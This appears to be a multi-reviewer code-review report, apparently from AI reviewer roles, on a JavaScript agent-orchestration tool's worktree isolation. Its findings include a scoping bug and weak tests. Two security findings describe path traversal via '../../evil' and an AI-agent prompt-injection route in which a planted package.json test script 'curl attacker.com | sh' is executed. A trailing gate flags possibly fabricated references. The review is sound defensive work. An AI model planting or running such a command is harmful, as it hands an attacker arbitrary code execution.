## Parallel Review Findings

🔴 [engineer] `bin/lib/run.mjs:1025` — `let completed`, `let blocked`, `const startTime` declared inside `try {}` (opened line 950, closed line 1474 by `} finally {}`). JavaScript `let`/`const` are block-scoped — these throw `ReferenceError` at lines 1477, 1490, 1491, 1535 on every successful run of `_runSingleFeature`. The completion report, token summary, and `return "done"`/`"blocked"` are unreachable. Fix: hoist all three declarations to function scope before `try {` at line 950 (alongside `let worktreePath = null` at line 942).
[simplicity] No 🔴 critical findings. Three 🟡 warnings:
🟡 [architect] `bin/lib/gate.mjs:59` — `cmdGate` hardcodes `cwd: process.cwd()` while `runGateInline` now accepts an injected worktree path; add a doc comment (or align the API) explaining that `cmdGate` is not worktree-aware, so the divergence is visible to future maintainers before it causes a silent isolation failure.
🟡 [engineer] `test/worktree.test.mjs:185` — `runGateInline` cwd test asserts `result.stdout.trim().includes(tmpDir.split("/").pop())` (last path segment only); basename collision or macOS symlink expansion gives a false positive. Use full-path equality.
🟡 [engineer] `test/worktree.test.mjs` — No test verifies `_runSingleFeature` passes `worktreePath` into `runGateInline`. Dropping `cwd` at line 1149 passes the entire suite.
🟡 [product] `test/worktree.test.mjs:186` — cwd assertion checks only `tmpDir.split("/").pop()` (last segment); two temp dirs with identical names produce a false positive — strengthen to full path equality
🟡 [product] `test/worktree.test.mjs` — no test verifies the `_runSingleFeature → runGateInline` wiring; a one-line drop of `cwd` at `run.mjs:1149` would not be caught since `runGateInline` silently defaults to `process.cwd()`
🟡 [tester] test/worktree.test.mjs:1 — No test verifies `_runSingleFeature` passes `worktreePath` as `cwd` to `runGateInline`; deleting the `cwd` arg from `run.mjs:1149` silently falls back to `process.cwd()` without failing any test — backlog a spy/mock test at the `_runSingleFeature` level
🟡 [tester] test/worktree.test.mjs:186 — `result.stdout.trim().includes(tmpDir.split("/").pop())` checks only the last path segment; use full-path equality to eliminate false positives from identically-suffixed temp dirs
[tester] Core claim verified by direct code trace: `runGateInline` at `run.mjs:52` accepts `cwd`, `execSync` at line 59 uses it, `_runSingleFeature` sets `cwd = worktreePath` at line 945, and passes it at line 1149. Three unit tests confirm it. Gate exited 0. The previously-critical `-b`→`-B` regression is confirmed fixed at `run.mjs:167` with tests covering it. Two 🟡 backlog items flagged — neither blocks this merge.
🟡 [security] `bin/lib/run.mjs:161` — Path traversal: `slug` is used raw in `join(mainCwd, ".team", "worktrees", slug)`. `slugToBranch(slug)` sanitizes for the **branch name** (line 162) but its sanitized output is never applied to the **path**. `path.join` resolves `..` segments — `createWorktreeIfNeeded("../../evil", "/repo")` produces `worktreePath = /repo/evil`, escaping `.team/worktrees/`. Fix: after line 161 add a resolve+startsWith guard: `if (!worktreePath.startsWith(join(mainCwd, ".team", "worktrees"))) throw new Error("unsafe slug")`
🟡 [security] `bin/lib/run.mjs:58` + `bin/lib/run.mjs:388–394` — Shell injection from AI-written worktree files: `detectGateCommand(cwd)` now reads from the **worktree** directory (since cwd = worktreePath after this change). It reads `package.json scripts.test` verbatim and passes it to `execSync(cmd, { shell: true })`. An AI agent that writes `"scripts": {"test": "curl attacker.com | sh"}` into the worktree's `package.json` before the gate runs achieves arbitrary code execution. This is a realistic prompt-injection path. Consider: (a) detecting the gate command from mainCwd rather than the worktree, or (b) allowlisting to known-safe commands.
🔵 [security] `bin/lib/run.mjs:161–162` — Sanitization asymmetry is invisible: `slugToBranch` output looks like it protects both uses, but it only protects the branch name. The raw slug flows into the path silently. Add a comment or the bounds check (see 🟡 above) to make this contract explicit.
🟡 [simplicity] `test/worktree.test.mjs:204` — `describe("slugToBranch normalization")` duplicates `describe("slugToBranch")` at line 14; both tests are fully covered there — delete them
🟡 [simplicity] `bin/lib/run.mjs:942` — `cwd` variable reused for both main-repo and worktree directory across the same function scope; rename the reassignment (`cwd = worktreePath`) to a separate variable to make the semantic shift explicit
🟡 [simplicity] `bin/lib/run.mjs:52` — `cwd = process.cwd()` default on the now-exported `runGateInline` is a silent footgun; any caller that forgets the 4th arg runs the gate against the wrong directory without warning — remove the default to require explicit passing
🔵 [architect] `test/worktree.test.mjs:186` — cwd assertion checks only `tmpDir.split("/").pop()` (last path segment); on macOS symlinks (`/var` → `/private/var`) or accidental basename collisions this could yield a false positive; strengthen to full path equality or `fs.realpathSync`.
🔵 [engineer] `bin/lib/run.mjs:325` — `dispatchToAgentAsync` cwd injection at line 335 has no dedicated unit test.
🔵 [engineer] `test/worktree.test.mjs:204` — `describe("slugToBranch normalization")` duplicates the top-level `slugToBranch` suite and never calls `createWorktreeIfNeeded`. Rename or replace.
🔵 [tester] bin/lib/run.mjs:52 — `cwd = process.cwd()` default is untested; add a test asserting that omitting the 4th arg produces `process.cwd()` behavior, documenting the fallback footgun
🔵 [tester] test/worktree.test.mjs:204 — `describe("slugToBranch normalization")` never calls `createWorktreeIfNeeded`; both tests invoke `slugToBranch` directly, duplicating the suite at line 14 — rename or replace
[simplicity] Two 🔵 suggestions:
🔵 [simplicity] `test/worktree.test.mjs:186` — cwd assertion checks only last path segment (`split("/").pop()`); use full-path equality to eliminate false positives from identically-suffixed temp dirs
🔵 [simplicity] `bin/lib/run.mjs:326` — `dispatchToAgentAsync` lacks `_spawnFn` injection unlike `dispatchToAgent`; parallel-review cwd injection path is untestable via mock

🟡 compound-gate.mjs:0 — Thin review warning: fabricated-refs

## Compound Gate

**Verdict:** WARN
**Layers tripped:** 1/5
**Tripped layers:** fabricated-refs